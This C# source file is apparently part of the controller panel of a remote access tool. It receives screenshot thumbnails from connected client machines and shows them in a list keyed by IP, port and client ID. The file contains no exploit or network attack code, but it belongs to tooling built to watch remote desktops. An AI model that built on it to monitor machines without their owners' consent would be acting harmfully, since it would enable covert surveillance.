using Server.MessagePack;
using Server.Connection;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    public class HandleThumbnails
    {
        public HandleThumbnails(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                if (client.LV2 == null)
                {
                    client.LV2 = new ListViewItem();
                    client.LV2.Text = string.Format("{0}:{1}", client.Ip, client.TcpClient.LocalEndPoint.ToString().Split(':')[1]);
                    client.LV2.ToolTipText = client.ID;
                    client.LV2.Tag = client;

                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                    {

                        Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                        client.LV2.ImageKey = client.ID;
                        lock (Settings.LockListviewThumb)
                        {
                            Program.form1.listView3.Items.Add(client.LV2);
                        }
                    }
                }
                else
                {
                    using (MemoryStream memoryStream = new MemoryStream(unpack_msgpack.ForcePathObject("Image").GetAsBytes()))
                    {
                        lock (Settings.LockListviewThumb)
                        {
                            Program.form1.ThumbnailImageList.Images.RemoveByKey(client.ID);
                            Program.form1.ThumbnailImageList.Images.Add(client.ID, Bitmap.FromStream(memoryStream));
                        }
                    }
                }
            }
            catch { }
        }
    }
}